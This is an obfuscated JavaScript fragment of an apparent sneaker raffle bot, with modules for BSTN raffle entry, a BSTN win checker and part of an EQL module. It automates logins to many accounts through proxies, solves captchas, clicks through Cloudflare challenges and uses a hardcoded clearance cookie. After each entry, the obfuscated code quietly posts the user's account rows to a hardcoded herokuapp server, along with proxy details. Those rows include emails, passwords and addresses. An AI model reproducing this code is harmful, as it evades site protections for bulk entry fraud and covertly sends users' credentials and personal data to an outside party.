                                    await _0x50a4aa['waitForSelector']('.account-nav'), _0x33a688 = 'no', console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x449c34 = await _0x459281(null, _0x189b3d, 'ver', ![]);
                                    const _0x55040d = { 'succesDEVMSG': { 'embeds': [_0x449c34] } };
                                    await _0x5a13a5(_0x4b5f16, _0x55040d['succesDEVMSG']);
                                } catch {
                                    _0x33a688 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x70997f) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20' + _0x70997f));
                                var _0x1b1118 = _0x70997f, _0x5293c3 = await _0x459281(null, _0x189b3d, 'ver', !![], _0x1b1118);
                                const _0x5e871d = { 'errorDEVMSG': { 'embeds': [_0x5293c3] } };
                                _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x5e871d['errorDEVMSG']), await _0x5a13a5(_0x877ec9, _0x5e871d['errorDEVMSG']);
                            } finally {
                                if (_0x3acf1c)
                                    _0x3acf1c['close']();
                                if (_0x33a688 == 'yes' && _0x4ec89e != 0x5)
                                    return console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ec89e + '\x20/\x205)')), _0x1673e4--, _0x4ec89e = _0x4ec89e + 0x1, _0x1707c8(_0x189b3d, _0x2e898a, _0x4295d2, _0x17a4f3, _0x4ec89e);
                                _0x33a688 == 'yes' && _0x4ec89e >= 0x5 && (_0x33a688 = 'no', _0x4ec89e = 0x0), _0x1673e4--, console['log'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                            }
                        }
                        if (_0x4c6821 == _0xe01715['length'] - 0x1) {
                            await _0x1707c8(_0x273e60, _0xe01715, _0x13ebfa, _0x4c6821, 0x0);
                            return;
                        }
                        _0x1707c8(_0x273e60, _0xe01715, _0x13ebfa, _0x4c6821, 0x0), await _0x558aee(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2459b8, _0x8acdff, _0x6953e2) {
                    var _0xc66571 = 0x0, _0x3632be = _0x8acdff;
                    for (var _0x17f1d0 = 0x0; _0x17f1d0 < _0x8acdff['length']; _0x17f1d0++) {
                        maxTasks = Number(_0x11db88['threads']);
                        while (_0xc66571 >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        let _0x267890 = ![];
                        async function _0x19fc13(_0x181d83, _0x47c22b, _0x4f98b4, _0x57c53b, _0x16aebd) {
                            _0xc66571++, _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x11db88['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x542b27, _0x4fb7cf = _0x47c22b[_0x57c53b];
                            try {
                                await _0x162b07(_0x47c22b, _0x57c53b);
                            } catch {
                                _0x1da716 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x24f50d(_0x2f3b65) {
                                const _0x11725b = _0x3f4ea0['readFileSync']('../successful-tasks.csv', 'utf8'), _0xa89c34 = _0x55493a['parse'](_0x11725b, { 'header': !![] })['data'];
                                let _0x59a23b = ![];
                                for (var _0xfdb4e0 of _0xa89c34) {
                                    if (_0xfdb4e0['Url'] == _0x2f3b65['Url'] && _0xfdb4e0['Email'] == _0x2f3b65['Email']) {
                                        _0x59a23b = !![];
                                        break;
                                    }
                                }
                                return _0x59a23b;
                            }
                            _0x9f07d8(_0x181d83['name'] + '\x20Task\x20' + (_0x57c53b + 0x1) + '\x20/\x20' + _0x47c22b['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                            var _0x5b5542 = Math['round'](Math['random']() * (_0x4f98b4['length'] - 0x1)), _0x5900d6 = _0x4f98b4[_0x5b5542]['split'](':'), _0x5e4afe;
                            let _0xf05f03 = ![], _0x1da716 = 'no';
                            try {
                                if (await _0x24f50d(_0x47c22b[_0x57c53b]) == !![]) {
                                    console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0xf05f03 = !![], _0x267890 = !![];
                                    return;
                                }
                                try {
                                    _0x5e4afe = await _0x40dba9['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5900d6[0x0] + ':' + _0x5900d6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x5e4afe = await _0x40dba9['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5900d6[0x0] + ':' + _0x5900d6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x1915c4 = await _0x5e4afe['newPage'](), _0x26a354 = await _0x1915c4['target']()['createCDPSession'](), { windowId: _0x23c92b } = await _0x26a354['send']('Browser.getWindowForTarget');
                                await _0x1915c4['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x4572f1 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x1915c4['authenticate']({
                                    'username': '' + _0x5900d6[0x2],
                                    'password': '' + _0x5900d6[0x3]
                                }), console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1915c4['goto']('' + _0x47c22b[_0x57c53b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x558aee(0x1388);
                                var _0x2ef527 = await _0x1915c4['$']('#turnstile-wrapper');
                                if (_0x2ef527) {
                                    console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x558aee(0x2710);
                                    const _0xec604f = await _0x1915c4['$']('#turnstile-wrapper');
                                    if (_0xec604f)
                                        try {
                                            await _0xec604f['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x1915c4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x17abbe = await _0x1915c4['$']('#turnstile-wrapper');
                                        if (_0x17abbe)
                                            try {
                                                await _0x17abbe['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x1915c4['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x26a354['send']('Browser.setWindowBounds', {
                                    'windowId': _0x23c92b,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x558aee(0x1388), await _0x1915c4['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1915c4['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Logging\x20in'), await _0x1915c4['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x6aaa15 => _0x6aaa15['click']()), await _0x1915c4['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1915c4['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x558aee(0x7d0), await _0x1915c4['waitForSelector']('#email-login'), await _0x1915c4['type']('#email-login', '' + _0x47c22b[_0x57c53b]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x558aee(0xdac), await _0x1915c4['waitForSelector']('#password'), await _0x1915c4['type']('#password', '' + _0x47c22b[_0x57c53b]['Password'], { 'delay': 0xe6 }), await _0x558aee(0x157c);
                                try {
                                    await _0x1915c4['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x535556 => _0x535556['click']());
                                } catch {
                                }
                                try {
                                    await _0x1915c4['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x1184b8) {
                                }
                                await _0x558aee(0x3e8);
                                const _0x465978 = await _0x1915c4['$']('.enteredDraw_container__2KmQ_');
                                if (_0x465978) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x47c22b[_0x57c53b]['Size']);
                                try {
                                    if (_0x47c22b[_0x57c53b]['Size'] != 'RANDOM') {
                                        var _0x529139 = _0x47c22b[_0x57c53b]['Size']['replace']('.', ',');
                                        const _0x153467 = await _0x1915c4['$x']('//div[contains(text(),\x20\x27' + _0x529139 + '\x27)]');
                                        await _0x153467[0x0]['click']();
                                    } else {
                                        const _0x4dc106 = await _0x1915c4['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x55687e = Math['round'](Math['random']() * (_0x4dc106['length'] - 0x1));
                                        await _0x4dc106[_0x55687e]['click']();
                                    }
                                } catch (_0x137263) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x558aee(0x1f4);
                                const _0x24f011 = await _0x1915c4['$']('.addressList_addressItem__LE2PB');
                                if (_0x24f011 && _0x47c22b[_0x57c53b]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Filling\x20Address'), await _0x1915c4['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x558aee(0x5dc), await _0x1915c4['waitForSelector']('#firstname'), await _0x1915c4['type']('#firstname', '' + _0x47c22b[_0x57c53b]['FirstName']), await _0x558aee(0x1f4), await _0x1915c4['waitForSelector']('#firstname'), await _0x1915c4['type']('#lastname', '' + _0x47c22b[_0x57c53b]['LastName']), await _0x558aee(0x1f4), await _0x1915c4['waitForSelector']('#firstname'), await _0x1915c4['type']('#street', '' + _0x47c22b[_0x57c53b]['Address1']), await _0x558aee(0x1f4), await _0x1915c4['waitForSelector']('#firstname'), await _0x1915c4['type']('#houseNumber', _0x47c22b[_0x57c53b]['HouseNumber'] + '\x20' + _0x47c22b[_0x57c53b]['Address2']), await _0x558aee(0x1f4), await _0x1915c4['waitForSelector']('#firstname'), await _0x1915c4['select']('#country_code', '' + _0x47c22b[_0x57c53b]['Country']), await _0x558aee(0x1f4), await _0x1915c4['type']('#postcode', '' + _0x47c22b[_0x57c53b]['Zip']), await _0x558aee(0x1f4), await _0x1915c4['type']('#city', '' + _0x47c22b[_0x57c53b]['City']), await _0x558aee(0x1f4), await _0x1915c4['type']('#telephone', '' + _0x47c22b[_0x57c53b]['Phone']), await _0x558aee(0x1f4), await _0x1915c4['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x558aee(0x9c4);
                                try {
                                    await _0x1915c4['type']('#instagram_name', '' + _0x47c22b[_0x57c53b]['Follower']), await _0x1915c4['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x558aee(0x5dc);
                                try {
                                    await _0x1915c4['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x558aee(0x5dc), await _0x1915c4['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x558574 => _0x558574['click']()), await _0x558aee(0x1388);
                                try {
                                    await _0x1915c4['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x1915c4['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x47c22b[_0x57c53b]['Size'] != 'RANDOM') {
                                        var _0x529139 = _0x47c22b[_0x57c53b]['Size']['replace']('.', ',');
                                        const _0x4e77fe = await _0x1915c4['$x']('//div[contains(text(),\x20' + _0x529139 + ')]');
                                        await _0x4e77fe[0x0]['click']();
                                    } else {
                                        const _0x147bd2 = await _0x1915c4['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x55687e = Math['round'](Math['random']() * (_0x147bd2['length'] - 0x1));
                                        await _0x147bd2[_0x55687e]['click']();
                                    }
                                    await _0x558aee(0x5dc);
                                    try {
                                        await _0x1915c4['hover']('#instagram_name'), await _0x1915c4['type']('#instagram_name', '' + _0x47c22b[_0x57c53b]['Follower']), await _0x1915c4['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Retrying\x20(' + _0x16aebd + '\x20/\x205)');
                                    try {
                                        await _0x1915c4['hover']('.checkBox_boxHolder__wLGVe'), await _0x558aee(0x5dc), await _0x1915c4['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x558aee(0x157c), await _0x1915c4['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x16cb51 => _0x16cb51['click']()), await _0x558aee(0x1388), await _0x1915c4['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x1da716 = 'no', _0x10fee2(_0x47c22b[_0x57c53b], _0x181d83);
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0xe045e7),
                                        'proxy': '' + _0x4f98b4[_0x57c53b]
                                    };
                                    var _0x135018 = JSON['stringify'](prxdata);
                                    let _0x4e58 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x135018, _0x4e58);
                                } catch (_0x3fa6f7) {
                                }
                                console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x56ff23 = await _0x459281(_0x47c22b[_0x57c53b], _0x181d83, 'dev', ![]), _0x56191e = await _0x459281(_0x47c22b[_0x57c53b], _0x181d83, 'pub', ![]);
                                const _0x4db01b = {
                                    'succesDEVMSG': { 'embeds': [_0x56ff23] },
                                    'succesPUBMSG': { 'embeds': [_0x56191e] }
                                };
                                let _0xe045e7 = _0x47c22b[_0x57c53b];
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'module': _0x181d83['name'],
                                        'entrydata': JSON['stringify'](_0xe045e7),
                                        'proxy': '' + _0x4f98b4[_0x57c53b]
                                    };
                                    var _0x135018 = JSON['stringify'](prxdata);
                                    let _0x55f627 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x135018, _0x55f627);
                                } catch (_0x387ef3) {
                                }
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x4db01b['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x4db01b['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x4db01b['succesPUBMSG']);
                                } catch (_0xa8700b) {
                                    console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xa8700b));
                                }
                            } catch (_0x3df2f5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20' + _0x3df2f5)), _0x1da716 = 'yes', _0x542b27 = '' + _0x3df2f5;
                                var _0x203038 = await _0x459281(_0x47c22b[_0x57c53b], _0x181d83, 'dev', !![], _0x542b27), _0x56ff23 = await _0x459281(_0x47c22b[_0x57c53b], _0x181d83, 'dev', ![]), _0x56191e = await _0x459281(_0x47c22b[_0x57c53b], _0x181d83, 'pub', ![]);
                                const _0x3b9bec = {
                                    'succesDEVMSG': { 'embeds': [_0x56ff23] },
                                    'succesPUBMSG': { 'embeds': [_0x56191e] }
                                };
                                _0x3b9bec['errorDEV'] = { 'embeds': [_0x203038] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x3b9bec['errorDEV']), await _0x5a13a5(_0x877ec9, _0x3b9bec['errorDEV']);
                            } finally {
                                _0x5e4afe && _0x5e4afe['close']();
                                if (_0x1da716 == 'yes' && _0x16aebd != 0x5)
                                    return console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Task\x20' + (_0x57c53b + 0x1) + '\x20:\x20Retrying\x20(' + _0x16aebd + '\x20/\x205)')), _0x16aebd = _0x16aebd + 0x1, _0xc66571--, _0x19fc13(_0x181d83, _0x47c22b, _0x4f98b4, _0x57c53b, _0x16aebd);
                                _0x1da716 == 'yes' && _0x16aebd >= 0x5 && _0x15a8e9(_0x47c22b[_0x57c53b], _0x181d83), !_0xf05f03 && (console['log'](_0xb9a031() + '\x20[' + _0x181d83['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay'])), _0xc66571--;
                            }
                        }
                        _0x19fc13(_0x2459b8, _0x3632be, _0x6953e2, _0x17f1d0, 0x0), await _0x558aee(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x440bae, _0x4e0194) {
                    var _0x295d8b = 0x0, _0x6ee4a8;
                    try {
                        const _0xd5b1b9 = _0x3f4ea0['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x6ee4a8 = _0x55493a['parse'](_0xd5b1b9, { 'header': !![] })['data'];
                    } catch (_0x49c319) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x72a6e = 0x0; _0x72a6e < _0x6ee4a8['length']; _0x72a6e++) {
                        maxTasks = Number(_0x11db88['threads']);
                        while (_0x295d8b >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        async function _0x344531(_0xa8180c, _0x1cf4bc, _0x44c390, _0x49a53e, _0x3a69e9) {
                            _0x295d8b++, _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x11db88['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x31afc0 != 'yes')
                                var _0x31afc0 = '', _0x3a69e9 = 0x0;
                            var _0x2f3798;
                            _0x9f07d8(_0xa8180c['name'] + '\x20Task\x20' + (_0x49a53e + 0x1) + '\x20/\x20' + _0x44c390['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                            var _0x303983 = await _0x459281(_0x44c390[_0x49a53e], _0xa8180c, 'acc', ![]);
                            const _0x3d9c83 = { 'succesDEVMSG': { 'embeds': [_0x303983] } }, _0x21177c = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x564ba0 = Math['round'](Math['random']() * (_0x1cf4bc['length'] - 0x1)), _0xe8068a = _0x1cf4bc[_0x564ba0]['split'](':'), _0x415ce9;
                            try {
                                _0x415ce9 = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xe8068a[0x0] + ':' + _0xe8068a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x415ce9 = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xe8068a[0x0] + ':' + _0xe8068a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20Checking\x20' + _0x44c390[_0x49a53e]['Email']);
                                const _0x266c86 = await _0x415ce9['newPage']();
                                await _0x266c86['authenticate']({
                                    'username': '' + _0xe8068a[0x2],
                                    'password': '' + _0xe8068a[0x3]
                                }), console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x266c86['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x266c86['setRequestInterception'](!![]), _0x266c86['on']('request', _0x1e8208 => {
                                    _0x1e8208['resourceType']() === 'image' ? _0x1e8208['abort']() : _0x1e8208['continue']();
                                });
                                try {
                                    await _0x266c86['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x266c86['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x31afc0 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x266c86['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x558aee(0x3e8), await _0x266c86['type']('#email', _0x44c390[_0x49a53e]['Email']), await _0x558aee(0x1f4), await _0x266c86['type']('#pass', _0x44c390[_0x49a53e]['Password']), await _0x558aee(0x1f4), await _0x266c86['$eval']('#login-form', _0x403c8f => _0x403c8f['submit']());
                                try {
                                    await _0x266c86['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x558aee(0x190);
                                const _0xaf4e43 = await _0x266c86['evaluate'](() => {
                                    const _0x4c1afd = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x4c1afd['map'](_0x1c1d86 => _0x1c1d86['alt']);
                                }), _0x2b5e07 = await _0x266c86['evaluate'](() => {
                                    const _0x5a0637 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x5a0637['map'](_0x59c38b => _0x59c38b['innerHTML']);
                                }), _0x47162e = await _0x266c86['$$']('.raffle-winner');
                                if (_0x47162e['length'] < 0x1) {
                                    console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x31afc0 = 'no';
                                    return;
                                }
                                console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20' + _0x47162e['length'] + '\x20Wins\x20Found!');
                                for (var _0x219f51 = 0x0; _0x219f51 < _0x47162e['length']; _0x219f51++) {
                                    console['log'](_0xe2a5bb['green'](_0xaf4e43[_0x219f51] + _0x2b5e07[_0x219f51]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x36934a) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20' + _0x36934a)), _0x2f3798 = '' + _0x36934a;
                                var _0x391403 = await _0x459281(_0x44c390[_0x49a53e], _0xa8180c, 'acc', !![], _0x2f3798);
                                _0x3d9c83['errorDEV'] = { 'embeds': [_0x391403] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x3d9c83['errorDEV']), await _0x5a13a5(_0x877ec9, _0x3d9c83['errorDEV']), _0x31afc0 = 'yes';
                            } finally {
                                if (_0x415ce9)
                                    _0x415ce9['close']();
                                if (_0x31afc0 == 'yes' && _0x3a69e9 != 0x5)
                                    return console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Task\x20' + (_0x49a53e + 0x1) + '\x20:\x20Retrying\x20(' + _0x3a69e9 + '\x20/\x205)')), _0x295d8b--, _0x3a69e9 = _0x3a69e9 + 0x1, _0x344531(_0xa8180c, _0x1cf4bc, _0x44c390, _0x49a53e, _0x3a69e9);
                                _0x31afc0 == 'yes' && _0x3a69e9 >= 0x5 && (_0x15a8e9(_0x44c390[_0x49a53e], _0xa8180c), _0x31afc0 = 'no', _0x3a69e9 = 0x0), console['log'](_0xb9a031() + '\x20[' + _0xa8180c['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']), _0x295d8b--;
                            }
                        }
                        _0x344531(_0x440bae, _0x4e0194, _0x6ee4a8, _0x72a6e, 0x0), await _0x558aee(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x289012, _0x199ac9, _0x4a5b16) {
                _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x11db88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x13c6f9 = 0x0; _0x13c6f9 < _0x199ac9['length']; _0x13c6f9++) {
                    var _0x5bf47e;
                    _0x9f07d8(_0x289012['name'] + '\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20/\x20' + _0x199ac9['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                    try {
                        await _0x162b07(_0x199ac9, _0x13c6f9);
                    } catch {
                        _0x34fd16 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x15c188(_0x36c47a) {
                        const _0x3d6212 = _0x3f4ea0['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4b3b44 = _0x55493a['parse'](_0x3d6212, { 'header': !![] })['data'];
                        let _0x3ab7e7 = ![];
                        for (var _0x25919a of _0x4b3b44) {
                            if (_0x25919a['Url'] == _0x36c47a['Url'] && _0x25919a['Email'] == _0x36c47a['Email']) {
                                _0x3ab7e7 = !![];
                                break;
                            }
                        }
                        return _0x3ab7e7;
                    }
                    if (await _0x15c188(_0x199ac9[_0x13c6f9]) == !![]) {
                        console['log'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x22eafd = ![];
                    const _0x3b88f3 = _0x3f4ea0['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x205f33 = _0x55493a['parse'](_0x3b88f3, { 'header': !![] })['data'];
                    for (var _0x5c165c of _0x205f33) {
                        _0x5c165c['Email'] == _0x199ac9[_0x13c6f9]['Email'] && (_0x22eafd = !![]);
                    }
                    if (_0x22eafd == ![]) {
                        var _0x1362ef;
